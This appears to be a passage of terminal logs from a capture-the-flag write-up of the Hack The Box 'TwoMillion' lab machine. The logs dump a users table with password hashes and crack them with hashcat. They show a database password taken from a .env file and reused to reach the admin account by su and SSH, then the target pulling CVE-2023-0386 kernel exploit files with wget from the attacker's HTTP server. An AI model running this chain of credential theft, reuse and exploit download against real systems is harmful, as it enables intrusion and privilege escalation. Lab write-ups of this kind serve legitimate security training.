Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb_prod           |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> USE htb_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb_prod]>

```

``` bash

MariaDB [htb_prod]> SHOW TABLES;
+--------------------+
| Tables_in_htb_prod |
+--------------------+
| invite_codes       |
| users              |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [htb_prod]> SELECT * FROM users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | test         | test@test.com              | $2y$10$/BeV5batdT89Kuwph5Vvtef6c7h4Xl9NtONXu6Zwrp25mXaf57LqS |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
3 rows in set (0.000 sec)

MariaDB [htb_prod]>

```

``` bash

❯ cat hash.txt
$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq
$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK
❯ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz, 2936/5873 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 512 MB (6712 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>

```

``` bash

www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ ls /home/
admin
www-data@2million:~/html$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:/var/www/html$

```

``` bash

❯ ssh admin@2million.htb
The authenticity of host '2million.htb (10.129.229.66)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '2million.htb' (ED25519) to the list of known hosts.
admin@2million.htb's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul 30 01:11:55 AM UTC 2026

  System load:           0.0
  Usage of /:            81.7% of 4.82GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.66
  IPv6 address for eth0: dead:beef::a0de:adff:feac:fde2

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$

```

``` bash

admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$

```

``` bash

❯ git clone https://github.com/puckiestyle/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 39, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (28/28), done.
remote: Total 39 (delta 16), reused 24 (delta 7), pack-reused 0 (from 0)
Receiving objects: 100% (39/39), 429.54 KiB | 2.24 MiB/s, done.
Resolving deltas: 100% (16/16), done.
❯ cd CVE-2023-0386
❯ ls
exp.c  fuse.c  getshell.c  Makefile  ovlcap  README.md  test
╭─ ~/hacking/ctf/htb/easy/twomillion/scripts/CVE-2023-0386 │ main                                                  ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ python3 -m http.server 9090

Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.129.229.66 - - [30/Jul/2026 03:47:59] "GET /exp.c HTTP/1.1" 200 -
10.129.229.66 - - [30/Jul/2026 03:48:09] "GET /fuse.c HTTP/1.1" 200 -
10.129.229.66 - - [30/Jul/2026 03:48:20] "GET /getshell.c HTTP/1.1" 200 -
10.129.229.66 - - [30/Jul/2026 03:48:36] "GET /Makefile HTTP/1.1" 200 -


```

``` bash

admin@2million:~$ mkdir CVE
admin@2million:~$ cd CVE/
admin@2million:~/CVE$ wget http://10.10.15.242:9090/exp.c
--2026-07-30 01:47:46--  http://10.10.15.242:9090/exp.c
Connecting to 10.10.15.242:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3093 (3.0K) [text/x-csrc]
Saving to: ‘exp.c’

exp.c                         100%[=================================================>]   3.02K  --.-KB/s    in 0.001s

2026-07-30 01:47:46 (2.77 MB/s) - ‘exp.c’ saved [3093/3093]

admin@2million:~/CVE$ wget http://10.10.15.242:9090/fuse.c
--2026-07-30 01:47:56--  http://10.10.15.242:9090/fuse.c
Connecting to 10.10.15.242:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5616 (5.5K) [text/x-csrc]
Saving to: ‘fuse.c’

fuse.c                        100%[=================================================>]   5.48K  --.-KB/s    in 0.001s

2026-07-30 01:47:56 (10.0 MB/s) - ‘fuse.c’ saved [5616/5616]

admin@2million:~/CVE$ wget http://10.10.15.242:9090/getshell.c
--2026-07-30 01:48:07--  http://10.10.15.242:9090/getshell.c
Connecting to 10.10.15.242:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 549 [text/x-csrc]
Saving to: ‘getshell.c’

getshell.c                    100%[=================================================>]     549  --.-KB/s    in 0s

2026-07-30 01:48:07 (69.6 MB/s) - ‘getshell.c’ saved [549/549]

admin@2million:~/CVE$ wget http://10.10.15.242:9090/Makefile
--2026-07-30 01:48:23--  http://10.10.15.242:9090/Makefile
Connecting to 10.10.15.242:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 150 [application/octet-stream]
Saving to: ‘Makefile’

Makefile                      100%[=================================================>]     150  --.-KB/s    in 0s

2026-07-30 01:48:23 (22.0 MB/s) - ‘Makefile’ saved [150/150]

admin@2million:~/CVE$

```
